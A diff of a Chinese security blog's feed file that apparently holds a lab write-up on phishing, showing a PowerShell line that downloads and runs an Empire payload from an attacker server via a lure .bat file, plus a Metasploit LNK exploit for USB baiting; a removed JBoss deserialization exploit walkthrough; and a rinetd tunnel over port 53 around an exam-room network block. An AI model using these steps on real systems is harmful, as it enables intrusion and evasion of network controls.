 <h4 id="第四步：构造一个empire-bat文件作为钓鱼文件，当靶机执行此bat文件时就会自动去我们的server下载对应的payload，这样就不必将payload直接发送给靶机，这在一定程度上可以绕过杀软"><a href="#第四步：构造一个empire-bat文件作为钓鱼文件，当靶机执行此bat文件时就会自动去我们的server下载对应的payload，这样就不必将payload直接发送给靶机，这在一定程度上可以绕过杀软" class="headerlink" title="第四步：构造一个empire.bat文件作为钓鱼文件，当靶机执行此bat文件时就会自动去我们的server下载对应的payload，这样就不必将payload直接发送给靶机，这在一定程度上可以绕过杀软"></a>第四步：构造一个empire.bat文件作为钓鱼文件，当靶机执行此bat文件时就会自动去我们的server下载对应的payload，这样就不必将payload直接发送给靶机，这在一定程度上可以绕过杀软</h4><blockquote>
 <p>powershell -ExecutionPolicy Bypass IEX(New-Object Net.Webclient).DownloadString(‘<a href="http://192.168.1.109/empire.psl" target="_blank" rel="external">http://192.168.1.109/empire.psl</a>‘)</p>
 </blockquote>
-<p><img src="https://note.youdao.com/yws/public/resource/9b5fd3963fef1483bdee9b0e9825bcd6/xmlnote/C58078A1F91E4AACA92E5FA2A55926D4/6557" alt="image"></p>
-<h4 id="第五步：通过邮件或者社工的方式将empire-bat发送给鱼儿钓鱼啦，一旦不小心双击运行就成功上钩"><a href="#第五步：通过邮件或者社工的方式将empire-bat发送给鱼儿钓鱼啦，一旦不小心双击运行就成功上钩" class="headerlink" title="第五步：通过邮件或者社工的方式将empire.bat发送给鱼儿钓鱼啦，一旦不小心双击运行就成功上钩"></a>第五步：通过邮件或者社工的方式将empire.bat发送给鱼儿钓鱼啦，一旦不小心双击运行就成功上钩</h4><p><img src="https://note.youdao.com/yws/public/resource/9b5fd3963fef1483bdee9b0e9825bcd6/xmlnote/931F390C622A47319811FB1E916D1283/6568" alt="image"></p>
+<p><img src="http://p1m5hqy4k.bkt.clouddn.com//花式钓鱼法/20171227183043_KXE7fh_6557.jpeg" alt=""></p>
+<h4 id="第五步：通过邮件或者社工的方式将empire-bat发送给鱼儿钓鱼啦，一旦不小心双击运行就成功上钩"><a href="#第五步：通过邮件或者社工的方式将empire-bat发送给鱼儿钓鱼啦，一旦不小心双击运行就成功上钩" class="headerlink" title="第五步：通过邮件或者社工的方式将empire.bat发送给鱼儿钓鱼啦，一旦不小心双击运行就成功上钩"></a>第五步：通过邮件或者社工的方式将empire.bat发送给鱼儿钓鱼啦，一旦不小心双击运行就成功上钩</h4><p><img src="http://p1m5hqy4k.bkt.clouddn.com//花式钓鱼法/20171227183057_N8sfP9_6568.jpeg" alt=""></p>
 <hr>
 <h1 id="情景六："><a href="#情景六：" class="headerlink" title="情景六："></a>情景六：</h1><blockquote>
 <p>利用USB社工钓鱼，记得当初看黑客军团时里面的黑客小姐姐就是利用BadUSB加社工黑进监狱的</p>
@@ -115,44 +146,13 @@
 <h4 id="第一步：利用msf生成攻击向量"><a href="#第一步：利用msf生成攻击向量" class="headerlink" title="第一步：利用msf生成攻击向量"></a>第一步：利用msf生成攻击向量</h4><blockquote>
 <p>use exploit/windows/fileformat/cve_2017_8464_lnk_rce</p>
 </blockquote>
-<p><img src="https://note.youdao.com/yws/public/resource/9b5fd3963fef1483bdee9b0e9825bcd6/xmlnote/DE2E69C2545841CE9B6A7F788239D034/6507" alt="image"></p>
-<h4 id="第二步：将攻击向量放到USB中，并启动msf监听"><a href="#第二步：将攻击向量放到USB中，并启动msf监听" class="headerlink" title="第二步：将攻击向量放到USB中，并启动msf监听"></a>第二步：将攻击向量放到USB中，并启动msf监听</h4><p><img src="https://note.youdao.com/yws/public/resource/9b5fd3963fef1483bdee9b0e9825bcd6/xmlnote/B8FEAEA43D1A4916AFE41D5184208A39/6514" alt="image"></p>
-<p><img src="https://note.youdao.com/yws/public/resource/9b5fd3963fef1483bdee9b0e9825bcd6/xmlnote/DF6A97B9D86C46379F070A4893952CD2/6518" alt="image"></p>
-<h4 id="第三步：打开USB，因为笔者是个穷学生使用的不是BadUSB所以里面的文件不会自动执行，这里需要我手动运行"><a href="#第三步：打开USB，因为笔者是个穷学生使用的不是BadUSB所以里面的文件不会自动执行，这里需要我手动运行" class="headerlink" title="第三步：打开USB，因为笔者是个穷学生使用的不是BadUSB所以里面的文件不会自动执行，这里需要我手动运行"></a>第三步：打开USB，因为笔者是个穷学生使用的不是BadUSB所以里面的文件不会自动执行，这里需要我手动运行</h4><p><img src="https://note.youdao.com/yws/public/resource/9b5fd3963fef1483bdee9b0e9825bcd6/xmlnote/84E48C2210DA4E24843D4B7DE18ADE93/6527" alt="image"></p>
-<p><img src="https://note.youdao.com/yws/public/resource/9b5fd3963fef1483bdee9b0e9825bcd6/xmlnote/34C6DF9B250C42B0B0213F9B5DAE8D49/6529" alt="image"></p>
+<p><img src="http://p1m5hqy4k.bkt.clouddn.com//花式钓鱼法/20171227183113_tXAzGF_6507.jpeg" alt=""></p>
+<h4 id="第二步：将攻击向量放到USB中，并启动msf监听"><a href="#第二步：将攻击向量放到USB中，并启动msf监听" class="headerlink" title="第二步：将攻击向量放到USB中，并启动msf监听"></a>第二步：将攻击向量放到USB中，并启动msf监听</h4><p><img src="http://p1m5hqy4k.bkt.clouddn.com//花式钓鱼法/20171227183126_dYJ5SW_6514.jpeg" alt=""></p>
+<p><img src="http://p1m5hqy4k.bkt.clouddn.com//花式钓鱼法/20171227183138_XzAql1_6518.jpeg" alt=""></p>
+<h4 id="第三步：打开USB，因为笔者是个穷学生使用的不是BadUSB所以里面的文件不会自动执行，这里需要我手动运行"><a href="#第三步：打开USB，因为笔者是个穷学生使用的不是BadUSB所以里面的文件不会自动执行，这里需要我手动运行" class="headerlink" title="第三步：打开USB，因为笔者是个穷学生使用的不是BadUSB所以里面的文件不会自动执行，这里需要我手动运行"></a>第三步：打开USB，因为笔者是个穷学生使用的不是BadUSB所以里面的文件不会自动执行，这里需要我手动运行</h4><p><img src="http://p1m5hqy4k.bkt.clouddn.com//花式钓鱼法/20171227183152_b9Kxw1_6527.jpeg" alt=""></p>
+<p><img src="http://p1m5hqy4k.bkt.clouddn.com//花式钓鱼法/20171227183205_jgJnId_6529.jpeg" alt=""></p>
 <hr>
-<h2 id="0x02-防御建议"><a href="#0x02-防御建议" class="headerlink" title="0x02. 防御建议"></a>0x02. 防御建议</h2><h3 id="多了解攻击手段，以攻代防，知己知彼"><a href="#多了解攻击手段，以攻代防，知己知彼" class="headerlink" title="[*] 多了解攻击手段，以攻代防，知己知彼"></a>[*] 多了解攻击手段，以攻代防，知己知彼</h3><h3 id="不要轻易打开任何可执行文件"><a href="#不要轻易打开任何可执行文件" class="headerlink" title="[*] 不要轻易打开任何可执行文件"></a>[*] 不要轻易打开任何可执行文件</h3><h3 id="不要轻易点击陌生链接"><a href="#不要轻易点击陌生链接" class="headerlink" title="[*] 不要轻易点击陌生链接"></a>[*] 不要轻易点击陌生链接</h3><h2 id="0x03-结语"><a href="#0x03-结语" class="headerlink" title="0x03. 结语"></a>0x03. 结语</h2><h4 id="emsp-emsp-网络钓鱼的花招千奇百怪，可谓大千世界无奇不有，但也不必总是如履薄冰，多看看多学学就不会那么轻易的成为别人的肉鸡了…"><a href="#emsp-emsp-网络钓鱼的花招千奇百怪，可谓大千世界无奇不有，但也不必总是如履薄冰，多看看多学学就不会那么轻易的成为别人的肉鸡了…" class="headerlink" title="&emsp;&emsp;网络钓鱼的花招千奇百怪，可谓大千世界无奇不有，但也不必总是如履薄冰，多看看多学学就不会那么轻易的成为别人的肉鸡了…"></a>&emsp;&emsp;网络钓鱼的花招千奇百怪，可谓大千世界无奇不有，但也不必总是如履薄冰，多看看多学学就不会那么轻易的成为别人的肉鸡了…</h4>]]></content>
-      
-        
-    </entry>
-    
-    <entry>
-      <title><![CDATA[JBOSS 反序列化漏洞复现]]></title>
-      <url>/2017/12/23/JBOSS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
-      <content type="html"><![CDATA[<h2 id="0x00-漏洞描述"><a href="#0x00-漏洞描述" class="headerlink" title="0x00. 漏洞描述"></a>0x00. 漏洞描述</h2><h4 id="2017年9月14日，国家信息安全漏洞共享平台（CNVD）收录了JBOSS-Application-Server反序列化命令执行漏洞（CNVD-2017-33724，对应CVE-2017-12149），远程攻击者利用漏洞可在未经任何身份验证的服务器主机上执行任意代码。漏洞细节和验证代码已公开，近期被不法分子利用出现大规模攻击尝试的可能性较大。"><a href="#2017年9月14日，国家信息安全漏洞共享平台（CNVD）收录了JBOSS-Application-Server反序列化命令执行漏洞（CNVD-2017-33724，对应CVE-2017-12149），远程攻击者利用漏洞可在未经任何身份验证的服务器主机上执行任意代码。漏洞细节和验证代码已公开，近期被不法分子利用出现大规模攻击尝试的可能性较大。" class="headerlink" title="2017年9月14日，国家信息安全漏洞共享平台（CNVD）收录了JBOSS Application Server反序列化命令执行漏洞（CNVD-2017-33724，对应CVE-2017-12149），远程攻击者利用漏洞可在未经任何身份验证的服务器主机上执行任意代码。漏洞细节和验证代码已公开，近期被不法分子利用出现大规模攻击尝试的可能性较大。"></a>2017年9月14日，国家信息安全漏洞共享平台（CNVD）收录了JBOSS Application Server反序列化命令执行漏洞（CNVD-2017-33724，对应CVE-2017-12149），远程攻击者利用漏洞可在未经任何身份验证的服务器主机上执行任意代码。漏洞细节和验证代码已公开，近期被不法分子利用出现大规模攻击尝试的可能性较大。</h4><a id="more"></a>
-<h2 id="0x01-漏洞复现"><a href="#0x01-漏洞复现" class="headerlink" title="0x01. 漏洞复现"></a>0x01. 漏洞复现</h2><h3 id="1-环境准备"><a href="#1-环境准备" class="headerlink" title="1). 环境准备"></a>1). 环境准备</h3><h4 id="1-JBOSS下载地址：http-download-jboss-org-jbossas-6-1-jboss-as-distribution-6-1-0-Final-zip"><a href="#1-JBOSS下载地址：http-download-jboss-org-jbossas-6-1-jboss-as-distribution-6-1-0-Final-zip" class="headerlink" title="1. JBOSS下载地址：http://download.jboss.org/jbossas/6.1/jboss-as-distribution-6.1.0.Final.zip"></a>1. JBOSS下载地址：<a href="http://download.jboss.org/jbossas/6.1/jboss-as-distribution-6.1.0.Final.zip" target="_blank" rel="external">http://download.jboss.org/jbossas/6.1/jboss-as-distribution-6.1.0.Final.zip</a></h4><h4 id="2-EXP下载地址：https-github-com-yunxu1-jboss-CVE-2017-12149"><a href="#2-EXP下载地址：https-github-com-yunxu1-jboss-CVE-2017-12149" class="headerlink" title="2. EXP下载地址：https://github.com/yunxu1/jboss-_CVE-2017-12149"></a>2. EXP下载地址：<a href="https://github.com/yunxu1/jboss-_CVE-2017-12149" target="_blank" rel="external">https://github.com/yunxu1/jboss-_CVE-2017-12149</a></h4><h3 id="2-环境搭建"><a href="#2-环境搭建" class="headerlink" title="2). 环境搭建"></a>2). 环境搭建</h3><h4 id="第一步：下载JBOSS环境，并解压"><a href="#第一步：下载JBOSS环境，并解压" class="headerlink" title="第一步：下载JBOSS环境，并解压"></a>第一步：下载JBOSS环境，并解压</h4><blockquote>
-<p>wget <a href="http://download.jboss.org/jbossas/6.1/jboss-as-distribution-6.1.0.Final.zip" target="_blank" rel="external">http://download.jboss.org/jbossas/6.1/jboss-as-distribution-6.1.0.Final.zip</a> </p>
-</blockquote>
-<p><img src="https://note.youdao.com/yws/public/resource/63e917c23f70500af829f5c34ac872b0/xmlnote/244E2AC8CADD4783A46633B0AE2FE53B/6293" alt="image"></p>
-<h4 id="第二步：修改配置文件，使网络中的主机都能访问JBOSS"><a href="#第二步：修改配置文件，使网络中的主机都能访问JBOSS" class="headerlink" title="第二步：修改配置文件，使网络中的主机都能访问JBOSS"></a>第二步：修改配置文件，使网络中的主机都能访问JBOSS</h4><blockquote>
-<p>vim ~/jboss-6.1.0.Final/server/default/deploy/jbossweb.sar/server.xml</p>
-</blockquote>
-<p><img src="https://note.youdao.com/yws/public/resource/63e917c23f70500af829f5c34ac872b0/xmlnote/665B4446C24845B3ABF127D4BC206544/6301" alt="image"></p>
-<h4 id="第三步：启动JBOSS"><a href="#第三步：启动JBOSS" class="headerlink" title="第三步：启动JBOSS"></a>第三步：启动JBOSS</h4><blockquote>
-<p>./jboss-6.1.0.Final/bin/run.sh</p>
-</blockquote>
-<p><img src="https://note.youdao.com/yws/public/resource/63e917c23f70500af829f5c34ac872b0/xmlnote/8591FD1FF99D4DE2B175F28A136E85A3/6309" alt="image"></p>
-<h4 id="第四步：下载EXP"><a href="#第四步：下载EXP" class="headerlink" title="第四步：下载EXP"></a>第四步：下载EXP</h4><blockquote>
-<p>git clone <a href="https://github.com/yunxu1/jboss-_CVE-2017-12149" target="_blank" rel="external">https://github.com/yunxu1/jboss-_CVE-2017-12149</a></p>
-</blockquote>
-<p><img src="https://note.youdao.com/yws/public/resource/63e917c23f70500af829f5c34ac872b0/xmlnote/6BCF753FBE9F4D4A8D021DE9A6FA1C77/6316" alt="image"></p>
-<h3 id="3-信息收集"><a href="#3-信息收集" class="headerlink" title="3). 信息收集"></a>3). 信息收集</h3><h4 id="第一步：利用nmap对目标主机进行常用端口扫描"><a href="#第一步：利用nmap对目标主机进行常用端口扫描" class="headerlink" title="第一步：利用nmap对目标主机进行常用端口扫描"></a>第一步：利用nmap对目标主机进行常用端口扫描</h4><blockquote>
-<p>nmap 192.168.1.111 -A </p>
-</blockquote>
-<p><img src="https://note.youdao.com/yws/public/resource/63e917c23f70500af829f5c34ac872b0/xmlnote/1E1E02F8FE8540B79A62B47497AE2E4B/6329" alt="image"></p>
-<h4 id="第二步：访问目标主机的8080端口，看看能否正常访问"><a href="#第二步：访问目标主机的8080端口，看看能否正常访问" class="headerlink" title="第二步：访问目标主机的8080端口，看看能否正常访问"></a>第二步：访问目标主机的8080端口，看看能否正常访问</h4><p><img src="https://note.youdao.com/yws/public/resource/63e917c23f70500af829f5c34ac872b0/xmlnote/48F7744D3BDB499FB0CDDD9D6E917E78/6322" alt="image"></p>
-<h3 id="4-漏洞利用"><a href="#4-漏洞利用" class="headerlink" title="4). 漏洞利用"></a>4). 漏洞利用</h3><h4 id="利用刚才下载好的EXP进行漏洞利用，打开jboss反序列化-CVE-2017-12149-jar"><a href="#利用刚才下载好的EXP进行漏洞利用，打开jboss反序列化-CVE-2017-12149-jar" class="headerlink" title="利用刚才下载好的EXP进行漏洞利用，打开jboss反序列化_CVE-2017-12149.jar"></a>利用刚才下载好的EXP进行漏洞利用，打开jboss反序列化_CVE-2017-12149.jar</h4><p><img src="https://note.youdao.com/yws/public/resource/63e917c23f70500af829f5c34ac872b0/xmlnote/E0A6FFEDA4004C2D979509DFC1C6E1E6/6333" alt="image"></p>
-<h2 id="0x02-总结"><a href="#0x02-总结" class="headerlink" title="0x02. 总结"></a>0x02. 总结</h2><h3 id="emsp-emsp-行千里路，不如读万卷书…"><a href="#emsp-emsp-行千里路，不如读万卷书…" class="headerlink" title="&emsp;&emsp;行千里路，不如读万卷书…"></a>&emsp;&emsp;行千里路，不如读万卷书…</h3>]]></content>
+<h2 id="0x02-防御建议"><a href="#0x02-防御建议" class="headerlink" title="0x02. 防御建议"></a>0x02. 防御建议</h2><h3 id="多了解攻击手段，以攻代防，知己知彼"><a href="#多了解攻击手段，以攻代防，知己知彼" class="headerlink" title="[*] 多了解攻击手段，以攻代防，知己知彼"></a>[*] 多了解攻击手段，以攻代防，知己知彼</h3><h3 id="不要轻易打开任何可执行文件"><a href="#不要轻易打开任何可执行文件" class="headerlink" title="[*] 不要轻易打开任何可执行文件"></a>[*] 不要轻易打开任何可执行文件</h3><h3 id="不要轻易点击陌生链接"><a href="#不要轻易点击陌生链接" class="headerlink" title="[*] 不要轻易点击陌生链接"></a>[*] 不要轻易点击陌生链接</h3><h2 id="0x03-结语"><a href="#0x03-结语" class="headerlink" title="0x03. 结语"></a>0x03. 结语</h2><h3 id="emsp-emsp-网络钓鱼的花招千奇百怪，可谓大千世界无奇不有，但也不必总是如履薄冰，多看看多学学就不会那么轻易的成为别人的肉鸡了…"><a href="#emsp-emsp-网络钓鱼的花招千奇百怪，可谓大千世界无奇不有，但也不必总是如履薄冰，多看看多学学就不会那么轻易的成为别人的肉鸡了…" class="headerlink" title="&emsp;&emsp;网络钓鱼的花招千奇百怪，可谓大千世界无奇不有，但也不必总是如履薄冰，多看看多学学就不会那么轻易的成为别人的肉鸡了…"></a>&emsp;&emsp;网络钓鱼的花招千奇百怪，可谓大千世界无奇不有，但也不必总是如履薄冰，多看看多学学就不会那么轻易的成为别人的肉鸡了…</h3>]]></content>
       
         
     </entry>
@@ -160,30 +160,30 @@
     <entry>
       <title><![CDATA[RINET 的妙用]]></title>
       <url>/2017/12/23/RINETD%20%E7%9A%84%E5%A6%99%E7%94%A8/</url>
-      <content type="html"><![CDATA[<h2 id="0x00-闲言"><a href="#0x00-闲言" class="headerlink" title="0x00. 闲言"></a>0x00. 闲言</h2><h4 id="emsp-emsp-最近期末考试的时候，考试室内网络完全被屏蔽，根本访问不了外网，就连同是校园网的网络都访问不了，只能访问学校指定的考试网页，但是页面使用的是域名访问而不是IP，也就是说DNS服务的53端口的流量应该能出去，这样就能开始我们的骚操作了，下面纯属“猜测”，毕竟考试的时候不敢这么做。"><a href="#emsp-emsp-最近期末考试的时候，考试室内网络完全被屏蔽，根本访问不了外网，就连同是校园网的网络都访问不了，只能访问学校指定的考试网页，但是页面使用的是域名访问而不是IP，也就是说DNS服务的53端口的流量应该能出去，这样就能开始我们的骚操作了，下面纯属“猜测”，毕竟考试的时候不敢这么做。" class="headerlink" title="&emsp;&emsp;最近期末考试的时候，考试室内网络完全被屏蔽，根本访问不了外网，就连同是校园网的网络都访问不了，只能访问学校指定的考试网页，但是页面使用的是域名访问而不是IP，也就是说DNS服务的53端口的流量应该能出去，这样就能开始我们的骚操作了，下面纯属“猜测”，毕竟考试的时候不敢这么做。"></a>&emsp;&emsp;最近期末考试的时候，考试室内网络完全被屏蔽，根本访问不了外网，就连同是校园网的网络都访问不了，只能访问学校指定的考试网页，但是页面使用的是域名访问而不是IP，也就是说DNS服务的53端口的流量应该能出去，这样就能开始我们的骚操作了，下面纯属“猜测”，毕竟考试的时候不敢这么做。</h4><a id="more"></a>
-<h2 id="0x01-环境搭建"><a href="#0x01-环境搭建" class="headerlink" title="0x01. 环境搭建"></a>0x01. 环境搭建</h2><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a><strong>环境准备</strong></h3><h4 id="emsp-emsp-1-kali-linux-（-工具：rinetd-IP-192-168-1-104"><a href="#emsp-emsp-1-kali-linux-（-工具：rinetd-IP-192-168-1-104" class="headerlink" title="&emsp;&emsp;1. kali linux （ 工具：rinetd )  IP = 192.168.1.104"></a>&emsp;&emsp;1. kali linux （ 工具：rinetd )  IP = 192.168.1.104</h4><h4 id="emsp-emsp-2-win-xp-emsp-IP-1-1-1-103"><a href="#emsp-emsp-2-win-xp-emsp-IP-1-1-1-103" class="headerlink" title="&emsp;&emsp;2. win xp &emsp; IP = 1.1.1.103"></a>&emsp;&emsp;2. win xp &emsp; IP = 1.1.1.103</h4><h4 id="emsp-emsp-3-win-xp-emsp-IP-192-168-1-109"><a href="#emsp-emsp-3-win-xp-emsp-IP-192-168-1-109" class="headerlink" title="&emsp;&emsp;3. win xp &emsp; IP = 192.168.1.109"></a>&emsp;&emsp;3. win xp &emsp; IP = 192.168.1.109</h4><h4 id="emsp-emsp-4-monowall-emsp-LAN-IP-1-1-1-1-emsp-WAN-IP-192-168-1-112"><a href="#emsp-emsp-4-monowall-emsp-LAN-IP-1-1-1-1-emsp-WAN-IP-192-168-1-112" class="headerlink" title="&emsp;&emsp;4. monowall &emsp; LAN IP = 1.1.1.1 &emsp; WAN IP = 192.168.1.112"></a>&emsp;&emsp;4. monowall &emsp; LAN IP = 1.1.1.1 &emsp; WAN IP = 192.168.1.112</h4><blockquote>
+      <content type="html"><![CDATA[<h3 id="0x00-闲言"><a href="#0x00-闲言" class="headerlink" title="0x00. 闲言"></a>0x00. 闲言</h3><h4 id="emsp-emsp-最近期末考试的时候，考试室内网络完全被屏蔽，根本访问不了外网，就连同是校园网的网络都访问不了，只能访问学校指定的考试网页，但是页面使用的是域名访问而不是IP，也就是说DNS服务的53端口的流量应该能出去，这样就能开始我们的骚操作了，下面纯属“猜测”，毕竟考试的时候不敢这么做。"><a href="#emsp-emsp-最近期末考试的时候，考试室内网络完全被屏蔽，根本访问不了外网，就连同是校园网的网络都访问不了，只能访问学校指定的考试网页，但是页面使用的是域名访问而不是IP，也就是说DNS服务的53端口的流量应该能出去，这样就能开始我们的骚操作了，下面纯属“猜测”，毕竟考试的时候不敢这么做。" class="headerlink" title="&emsp;&emsp;最近期末考试的时候，考试室内网络完全被屏蔽，根本访问不了外网，就连同是校园网的网络都访问不了，只能访问学校指定的考试网页，但是页面使用的是域名访问而不是IP，也就是说DNS服务的53端口的流量应该能出去，这样就能开始我们的骚操作了，下面纯属“猜测”，毕竟考试的时候不敢这么做。"></a>&emsp;&emsp;最近期末考试的时候，考试室内网络完全被屏蔽，根本访问不了外网，就连同是校园网的网络都访问不了，只能访问学校指定的考试网页，但是页面使用的是域名访问而不是IP，也就是说DNS服务的53端口的流量应该能出去，这样就能开始我们的骚操作了，下面纯属“猜测”，毕竟考试的时候不敢这么做。</h4><a id="more"></a>
+<h3 id="0x01-环境搭建"><a href="#0x01-环境搭建" class="headerlink" title="0x01. 环境搭建"></a>0x01. 环境搭建</h3><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备:"></a><strong>环境准备:</strong></h3><h4 id="emsp-emsp-1-kali-linux-（-工具：rinetd-IP-192-168-1-104"><a href="#emsp-emsp-1-kali-linux-（-工具：rinetd-IP-192-168-1-104" class="headerlink" title="&emsp;&emsp;1. kali linux （ 工具：rinetd )  IP = 192.168.1.104"></a>&emsp;&emsp;1. kali linux （ 工具：rinetd )  IP = 192.168.1.104</h4><h4 id="emsp-emsp-2-win-xp-emsp-IP-1-1-1-103"><a href="#emsp-emsp-2-win-xp-emsp-IP-1-1-1-103" class="headerlink" title="&emsp;&emsp;2. win xp &emsp; IP = 1.1.1.103"></a>&emsp;&emsp;2. win xp &emsp; IP = 1.1.1.103</h4><h4 id="emsp-emsp-3-win-xp-emsp-IP-192-168-1-109"><a href="#emsp-emsp-3-win-xp-emsp-IP-192-168-1-109" class="headerlink" title="&emsp;&emsp;3. win xp &emsp; IP = 192.168.1.109"></a>&emsp;&emsp;3. win xp &emsp; IP = 192.168.1.109</h4><h4 id="emsp-emsp-4-monowall-emsp-LAN-IP-1-1-1-1-emsp-WAN-IP-192-168-1-112"><a href="#emsp-emsp-4-monowall-emsp-LAN-IP-1-1-1-1-emsp-WAN-IP-192-168-1-112" class="headerlink" title="&emsp;&emsp;4. monowall &emsp; LAN IP = 1.1.1.1 &emsp; WAN IP = 192.168.1.112"></a>&emsp;&emsp;4. monowall &emsp; LAN IP = 1.1.1.1 &emsp; WAN IP = 192.168.1.112</h4><blockquote>
 <p>[*]这里有monowall的简单<a href="http://www.heminjie.com/network/567.html" target="_blank" rel="external">配置方法</a></p>
 </blockquote>
-<p><img src="https://note.youdao.com/yws/public/resource/eb88ff2e11bd200c09d5a06a92893b5d/xmlnote/22AD7E165B7B460BACCEDAB6BAD28D5A/6724" alt="image"></p>
-<h3 id="配置路由表"><a href="#配置路由表" class="headerlink" title="配置路由表"></a><strong>配置路由表</strong></h3><h4 id="emsp-emsp-在xp中访问1-1-1-1进入防火墙配置页面，账号admin-密码mono，添加一条路由规则仅允许内网主机的流量通过DNS的53端口出外网（通过这条路由规则模拟学校限制网络之后的网络环境）"><a href="#emsp-emsp-在xp中访问1-1-1-1进入防火墙配置页面，账号admin-密码mono，添加一条路由规则仅允许内网主机的流量通过DNS的53端口出外网（通过这条路由规则模拟学校限制网络之后的网络环境）" class="headerlink" title="&emsp;&emsp;在xp中访问1.1.1.1进入防火墙配置页面，账号admin 密码mono，添加一条路由规则仅允许内网主机的流量通过DNS的53端口出外网（通过这条路由规则模拟学校限制网络之后的网络环境）"></a>&emsp;&emsp;在xp中访问1.1.1.1进入防火墙配置页面，账号admin 密码mono，添加一条路由规则仅允许内网主机的流量通过DNS的53端口出外网（通过这条路由规则模拟学校限制网络之后的网络环境）</h4><p><img src="https://note.youdao.com/yws/public/resource/eb88ff2e11bd200c09d5a06a92893b5d/xmlnote/8CE1C2EA47594AF8AC5DC7AD3944F89D/6728" alt="image"></p>
-<h2 id="0x02-实验步骤"><a href="#0x02-实验步骤" class="headerlink" title="0x02. 实验步骤"></a>0x02. 实验步骤</h2><h4 id="emsp-emsp-上面搭建的环境已经基本相似于学校考试室的网络环境，下面我们来实现仅通过53端口进行远程桌面连接外网192-168-1-109的xp。"><a href="#emsp-emsp-上面搭建的环境已经基本相似于学校考试室的网络环境，下面我们来实现仅通过53端口进行远程桌面连接外网192-168-1-109的xp。" class="headerlink" title="&emsp;&emsp;上面搭建的环境已经基本相似于学校考试室的网络环境，下面我们来实现仅通过53端口进行远程桌面连接外网192.168.1.109的xp。"></a>&emsp;&emsp;上面搭建的环境已经基本相似于学校考试室的网络环境，下面我们来实现仅通过53端口进行远程桌面连接外网192.168.1.109的xp。</h4><h4 id="1-首先，在kali中下载安装-rinetd-用于转发流量"><a href="#1-首先，在kali中下载安装-rinetd-用于转发流量" class="headerlink" title="1. 首先，在kali中下载安装 rinetd 用于转发流量"></a>1. 首先，在kali中下载安装 rinetd 用于转发流量</h4><blockquote>
+<p><img src="http://p1m5hqy4k.bkt.clouddn.com//Test/20171227181026_6raRvt_6724.jpeg" alt=""></p>
+<h3 id="配置路由表"><a href="#配置路由表" class="headerlink" title="配置路由表:"></a><strong>配置路由表:</strong></h3><h4 id="emsp-emsp-在xp中访问1-1-1-1进入防火墙配置页面，账号admin-密码mono，添加一条路由规则仅允许内网主机的流量通过DNS的53端口出外网（通过这条路由规则模拟学校限制网络之后的网络环境）"><a href="#emsp-emsp-在xp中访问1-1-1-1进入防火墙配置页面，账号admin-密码mono，添加一条路由规则仅允许内网主机的流量通过DNS的53端口出外网（通过这条路由规则模拟学校限制网络之后的网络环境）" class="headerlink" title="&emsp;&emsp;在xp中访问1.1.1.1进入防火墙配置页面，账号admin 密码mono，添加一条路由规则仅允许内网主机的流量通过DNS的53端口出外网（通过这条路由规则模拟学校限制网络之后的网络环境）"></a>&emsp;&emsp;在xp中访问1.1.1.1进入防火墙配置页面，账号admin 密码mono，添加一条路由规则仅允许内网主机的流量通过DNS的53端口出外网（通过这条路由规则模拟学校限制网络之后的网络环境）</h4><p><img src="http://p1m5hqy4k.bkt.clouddn.com//Test/20171227181041_6P6SB8_6728.jpeg" alt=""></p>
+<h3 id="0x02-实验步骤"><a href="#0x02-实验步骤" class="headerlink" title="0x02. 实验步骤"></a>0x02. 实验步骤</h3><h4 id="emsp-emsp-上面搭建的环境已经基本相似于学校考试室的网络环境，下面我们来实现仅通过53端口进行远程桌面连接外网192-168-1-109的xp。"><a href="#emsp-emsp-上面搭建的环境已经基本相似于学校考试室的网络环境，下面我们来实现仅通过53端口进行远程桌面连接外网192-168-1-109的xp。" class="headerlink" title="&emsp;&emsp;上面搭建的环境已经基本相似于学校考试室的网络环境，下面我们来实现仅通过53端口进行远程桌面连接外网192.168.1.109的xp。"></a>&emsp;&emsp;上面搭建的环境已经基本相似于学校考试室的网络环境，下面我们来实现仅通过53端口进行远程桌面连接外网192.168.1.109的xp。</h4><h4 id="1-首先，在kali中下载安装-rinetd-用于转发流量"><a href="#1-首先，在kali中下载安装-rinetd-用于转发流量" class="headerlink" title="1. 首先，在kali中下载安装 rinetd 用于转发流量"></a>1. 首先，在kali中下载安装 rinetd 用于转发流量</h4><blockquote>
 <p>apt-get install rinetd </p>
 </blockquote>
-<p><img src="https://note.youdao.com/yws/public/resource/eb88ff2e11bd200c09d5a06a92893b5d/xmlnote/8F248675816443F8904F1DEF4B80AD1B/6744" alt="image"></p>
+<p><img src="http://p1m5hqy4k.bkt.clouddn.com//Test/20171227181054_YeYibU_6744.jpeg" alt=""></p>
 <h4 id="2-然后，修改-rinetd-的配置文件，指定转发规则"><a href="#2-然后，修改-rinetd-的配置文件，指定转发规则" class="headerlink" title="2. 然后，修改 rinetd 的配置文件，指定转发规则"></a>2. 然后，修改 rinetd 的配置文件，指定转发规则</h4><blockquote>
 <p>vim /etc/rinetd.conf</p>
 </blockquote>
-<p><img src="https://note.youdao.com/yws/public/resource/eb88ff2e11bd200c09d5a06a92893b5d/xmlnote/2CB78D456E974AB78546085332ED1C44/6763" alt="image"></p>
+<p><img src="http://p1m5hqy4k.bkt.clouddn.com//Test/20171227181106_543GvN_6763.jpeg" alt=""></p>
 <h4 id="3-启动rinetd"><a href="#3-启动rinetd" class="headerlink" title="3. 启动rinetd"></a>3. 启动rinetd</h4><blockquote>
 <p>rinetd</p>
 </blockquote>
-<p><img src="https://note.youdao.com/yws/public/resource/eb88ff2e11bd200c09d5a06a92893b5d/xmlnote/C9ABDC7C85DA4A24AFDE853D073F304D/6758" alt="image"></p>
+<p><img src="http://p1m5hqy4k.bkt.clouddn.com//Test/20171227181117_VhwPW6_6758.jpeg" alt=""></p>
 <h4 id="4-启动远程桌面连接xp"><a href="#4-启动远程桌面连接xp" class="headerlink" title="4. 启动远程桌面连接xp"></a>4. 启动远程桌面连接xp</h4><blockquote>
 <p>mstsc</p>
 </blockquote>
-<p><img src="https://note.youdao.com/yws/public/resource/eb88ff2e11bd200c09d5a06a92893b5d/xmlnote/635CACA7169D4BFAA1D753BD62D83A92/6771" alt="image"></p>
-<p><img src="https://note.youdao.com/yws/public/resource/eb88ff2e11bd200c09d5a06a92893b5d/xmlnote/F42B0E2AAF07455FBE52C2641EE7E648/6773" alt="image"></p>
